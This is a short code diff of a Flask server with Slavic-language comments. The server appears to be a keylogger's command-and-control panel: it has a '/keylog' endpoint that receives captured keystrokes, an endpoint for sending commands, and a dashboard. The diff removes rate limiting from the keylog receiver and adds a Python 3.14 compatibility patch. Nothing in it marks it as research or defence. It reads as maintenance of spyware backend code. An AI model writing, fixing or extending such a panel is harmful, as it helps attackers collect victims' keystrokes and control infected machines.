@@ -10,20 +10,19 @@ import logging
 from functools import wraps
 from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
-from flask_limiter import Limiter
-from flask_limiter.util import get_remote_address
 from cryptography.fernet import Fernet
 import sys
 import pkgutil
+
 # Patch za Python 3.14
 if not hasattr(pkgutil, 'get_loader'):
     pkgutil.get_loader = lambda x: None
+
 # =====================================================================
 # KONFIGURACIJA
 # =====================================================================
 app = Flask(__name__)
 CORS(app)
-limiter = Limiter(app, key_func=get_remote_address)
 
 # Logging setup
 logging.basicConfig(
@@ -169,7 +168,6 @@ def dashboard():
 
 @app.route('/keylog', methods=['POST'])
 @require_auth
-@limiter.limit("20 per minute")
 def receive_keylog():
     try:
         data = request.get_json()
@@ -282,7 +280,7 @@ def api_send_command():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE (proširen)
+# DASHBOARD TEMPLATE
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
